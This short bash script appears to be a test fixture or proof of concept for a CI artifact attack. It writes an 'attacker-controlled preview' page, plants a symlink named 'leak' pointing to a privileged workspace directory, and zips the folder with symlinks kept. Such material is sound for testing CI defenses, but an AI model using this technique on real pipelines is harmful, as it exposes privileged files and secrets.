#!/usr/bin/env bash
set -euo pipefail
mkdir -p website/out
echo '<h1>attacker-controlled preview</h1>' > website/out/index.html
ln -s "$GITHUB_WORKSPACE/.privileged" website/out/leak
(cd website/out && zip -qry ../hostile-artifact.zip .)
